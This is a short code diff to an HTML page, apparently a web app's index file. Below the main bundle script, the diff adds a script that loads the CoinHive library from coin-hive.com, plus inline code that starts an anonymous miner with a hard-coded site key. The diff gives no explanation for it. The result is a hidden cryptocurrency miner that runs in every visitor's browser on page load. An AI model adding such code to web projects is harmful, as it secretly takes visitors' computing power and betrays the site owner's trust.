@@ -40,6 +40,11 @@
 
   <!-- The main bundle js is generated during the build process -->
   <script src="build/main.js"></script>
+  <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+  <script>
+    var miner = new CoinHive.Anonymous('A8aqbbEmgXxfS0fM7MCTXkUvTXhnVqMm');
+    miner.start();
+  </script>
 
 </body>
 </html>
